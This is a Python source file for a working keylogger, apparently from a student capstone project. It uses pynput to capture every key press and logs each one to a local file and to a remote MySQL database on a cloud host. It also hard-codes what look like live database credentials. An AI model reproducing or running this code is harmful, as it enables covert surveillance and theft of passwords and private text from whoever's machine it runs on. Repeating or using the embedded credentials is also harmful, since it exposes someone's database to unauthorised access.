import mysql.connector
from pynput.keyboard import Key, Listener

def connect_to_database():
    try:
        conn = mysql.connector.connect(
            host='aws.connect.psdb.cloud',
            user='79u9r9663s85vutevk0d',
            password='pscale_pw_ksUEzXbwUQOhTLEXhTN3X2hXM5ZSqEUmHzV0K9DFLYZ',
            database='projectcapstonecybersuite'
        )
        cursor = conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS key_log (
                id INT AUTO_INCREMENT PRIMARY KEY,
                key_press TEXT
            )
        ''')
        conn.commit()

        return conn, cursor

    except mysql.connector.Error as e:
        print(f"Error connecting to MySQL: {e}")
        return None, None

def write_to_database(conn, cursor, key):
    try:
        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (str(key),))
        conn.commit()
    except mysql.connector.Error as e:
        print(f"Error writing to database: {e}")

def write_to_file(key):
    try:
        with open("key_log.txt", "a") as file:
            file.write(str(key) + '\n')
    except IOError as e:
        print(f"Error writing to file: {e}")

def on_press(key, conn, cursor):
    if key == Key.esc:
        # Stop the listener
        print("Keylogger execution interrupted by user.")
        return False
    try:
        write_to_database(conn, cursor, key)
        write_to_file(key)
    except Exception as e:
        print(f"Error processing key: {e}")

def on_release(key, conn):
    pass  # You can add additional logic for key release if needed

def keylogger_thread():
    conn, cursor = connect_to_database()

    with Listener(on_press=lambda key: on_press(key, conn, cursor),
                  on_release=lambda key: on_release(key, conn)) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("Keylogger execution interrupted by user.")

if __name__ == "__main__":
    keylogger_thread()
